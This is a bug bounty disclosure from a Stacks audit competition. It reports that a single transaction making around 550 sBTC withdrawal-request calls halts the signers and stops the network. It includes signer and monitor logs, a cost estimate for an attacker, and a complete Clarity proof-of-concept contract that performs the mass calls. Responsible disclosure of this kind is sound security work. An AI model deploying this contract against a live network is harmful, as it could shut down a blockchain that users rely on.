# #40692 \[BC-High] Calling multiple withdrawals on a single transaction causes Signers to halt and the network to stop

**Submitted on Mar 1st 2025 at 15:01:37 UTC by @vini\_btc for** [**Attackathon | Stacks II**](https://immunefi.com/audit-competition/stacks-attackathon-2)

* **Report ID:** #40692
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_1.0>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

Multiple withdrawals called from the same transaction can cause Signers to halt, and mining to stop. This can be achieved by crafting a special contract that calls the sbtc initiate withdrawal function. A single contract call can call the withdrawal function 500+ times, which effectively "DOSes" the sbtc network 100%.

## Vulnerability Details

When multiple requests are started from a single transaction, the `request-decider` module of the signers quickly starts failing with:

`2025-03-01 14:36:48 2025-03-01T13:36:48.088677424Z ERROR request-decider{public_key=02007311430123d4cad97f4f7e86e023b28143130a18099ecf094d36fef0f6135c}: signer::request_decider: error handling signer message error=received an error when attempting to query the database: error returned from database: insert or update on table "withdrawal_signers" violates foreign key constraint "withdrawal_signers_request_id_block_hash_fkey"`

I also see a spam of logs looking like this in the Emily-Service:

```
2025-03-01 15:29:25 {"timestamp":"2025-03-01T14:29:25.928047552Z","level":"INFO","message":"192.168.48.13:37824 \"POST /withdrawal HTTP/1.1\" 201 \"-\" \"OpenAPI-Generator/0.1.0/rust\" 147.941125ms","log.target":"api","log.module_path":"warp::filters::log","log.file":"/usr/local/cargo/registry/src/index.crates.io-6f17d22bba15001f/warp-0.3.7/src/filters/log.rs","log.line":37,"filename":"/usr/local/cargo/registry/src/index.crates.io-6f17d22bba15001f/warp-0.3.7/src/filters/log.rs","line_number":37}
```

and the monitor acuses a Stacks blockchain halt:

```
2025-03-01 15:37:58 [14:37:57.267] WARN (monitor/29): No new stx block since 61.51 minutes ago
2025-03-01 15:37:58     height: 4299
2025-03-01 15:37:58     txCount: 1
2025-03-01 15:37:58     lastBurnBlock: "3703s ago"
2025-03-01 15:37:58     burnHash: "0x59dfd9b618ae1dd9659795400d8e9949db607904975e92489aa89d03a45a37ce"
2025-03-01 15:37:58     lastSeen: "2025-03-01T13:36:26.809Z"
2025-03-01 15:37:58     secSinceStxBlock: 3690.458
2025-03-01 15:37:58     minSinceStxBlock: "61.51"
2025-03-01 15:37:58     lastStxBlockTime: 1740836186809
```

The actual transaction abusing the network never confirms (see screenshots).

A single transaction can have around \~550 calls [to the initiate-withdrawal-request function](https://github.com/stacks-network/sbtc/blob/main/contracts/contracts/sbtc-withdrawal.clar#L130). At the upper bound limit number of calls, the error can be triggered consistently.

At the lower bound, the error can never be reproduced. For example, the same contract triggering only 10 requests goes through fine and doesn't cause any problems in the network.

## Impact Details

Such a transaction would be extremely viable economically. The attacker could craft the request calls in a way that they'd never be fulfilled - by setting the amount to the minimum dust amount and/or setting the max fee to pay to 0. The price of such a transaction currently on Stacks would probably still be bellow 50$ easily. Multiple of these transactions could potentially be called in succession for a relatively low $ price given the potential impact: completely stopping the Stacks Network.

## References

n/a

## Link to Proof of Concept

<https://gist.github.com/vini-btc/710583455a827257ab488e56f276503b>

## Proof of Concept

## Proof of Concept

```clarity
(define-private (abuse-withdrawal (res bool) (mes bool))
	(begin
   ;; BTC pubkey: 02e3af28965693b9ce1228f9d468149b831d6a0540b25e8a9900f71372c11fb277
   ;; BTC pubkey HASH160: 1e51fcdc14be9a148bb0aaec9197eb47c83776fb
		(is-err (contract-call? 'SN3R84XZYA63QS28932XQF3G1J8R9PC3W76P9CSQS.sbtc-withdrawal initiate-withdrawal-request u1000 {version: 0x00, hashbytes: 0x1e51fcdc14be9a148bb0aaec9197eb47c83776fb} u0))
		 res
	)
)

(define-public (abuse)
 (ok (fold abuse-withdrawal (list 
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
) true)))
```
